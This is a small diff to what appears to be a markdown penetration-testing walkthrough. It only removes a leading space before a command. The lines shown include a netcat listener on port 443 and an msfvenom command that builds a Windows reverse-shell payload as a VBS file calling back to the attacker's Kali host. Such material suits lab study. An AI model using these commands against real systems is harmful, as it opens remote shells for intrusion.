@@ -38,7 +38,7 @@ rlwrap nc -lvnp 443
 **Kali #1**
 
 ```
- msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f vbs -o exploit.vbs
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f vbs -o exploit.vbs
 ```
 
 **Kali #2**
